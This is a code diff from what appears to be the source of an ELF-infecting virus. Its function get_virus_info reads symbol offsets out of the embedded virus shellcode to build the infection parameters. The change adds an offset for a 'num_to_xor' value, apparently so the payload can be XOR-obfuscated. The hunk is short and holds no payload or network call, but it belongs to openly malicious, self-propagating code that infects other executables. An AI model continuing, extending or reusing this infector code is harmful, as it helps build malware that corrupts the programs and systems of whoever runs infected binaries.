@@ -87,9 +87,13 @@ int get_virus_info(InfectParams *p){
 	elf_off_symbol(virus_shellcode, virus_shellcode_len, "modified_table_len", (int64_t*)&modiftlen_off);
 	modiftlen_off -= bin_start_off;
 
+	int64_t num_to_xor_off;
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "num_to_xor", (int64_t*)&num_to_xor_off);
+	num_to_xor_off -= bin_start_off;
+
 	void *x = ft_malloc(1024);
 	((int*)x)[0] = 0;
-	*p = (InfectParams){v, l, cmpr_off, cmpr_len, c_off, c_len, decrypt_routine_off, x, data_off, dataearly_off, infectpush_off, infectpop_off, gbt_off, gbtlen_off, modift_off, modiftlen_off};
+	*p = (InfectParams){v, l, cmpr_off, cmpr_len, c_off, c_len, decrypt_routine_off, x, data_off, dataearly_off, infectpush_off, infectpop_off, gbt_off, gbtlen_off, modift_off, modiftlen_off, num_to_xor_off};
 	return TRUE;
 }
 
